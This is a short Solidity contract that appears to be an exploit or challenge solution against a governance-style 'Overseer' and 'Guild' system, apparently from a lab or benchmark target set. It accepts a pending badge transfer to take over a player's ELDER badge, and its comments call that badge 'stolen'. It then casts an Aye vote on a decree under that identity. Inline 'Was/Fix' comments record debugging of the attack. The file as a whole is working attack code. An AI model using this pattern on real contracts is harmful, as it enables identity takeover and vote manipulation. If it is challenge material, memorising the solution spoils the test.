// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.29;

import {IOverseer} from "targets/overseer/src/interfaces/IOverseer.sol";
import {Guild} from "targets/overseer/src/Guild.sol";

contract helper {
    bytes32 public constant DECREE_VOTED = keccak256("DECREE_VOTED");

    Guild public guild;
    IOverseer public over;
    bytes16 public guildBadge;

    // Was: stored `badge` and `player` — but we only need the guild badge for voting
    // The player's badge comes as a parameter since we need it for acceptBadgeChange

    constructor(Guild _guild, IOverseer _over) {
        guild = _guild;
        over = _over;
        // Was: no guildBadge stored
        guildBadge = _guild.badge();
    }

    function help(bytes16 _decreeId, bytes16 _playerBadge) external {
        // Step 1: Accept the player's badge — now we have their ELDER rank
        // Was: over.acceptBadgeChange(over.folkToBadge(player))
        // Fix: acceptBadgeChange takes the BADGE itself, not the folk's address lookup
        // It checks: _badgeToProposedFolk[_badge] == msg.sender (us)
        over.acceptBadgeChange(_playerBadge);

        // Step 2: Vote Aye using the stolen badge
        // Was: vote value was 2 (Nay). Fix: 1 = Aye
        uint8 vote = 1;
        over.oversee(
            // Was: over.folkToBadge(address(this)) — this works too since we now own the badge
            // But _playerBadge is the same thing, either works
            _playerBadge,
            guildBadge,
            DECREE_VOTED,
            bytes32(_decreeId),
            abi.encode(_decreeId, vote)
        );
    }
}
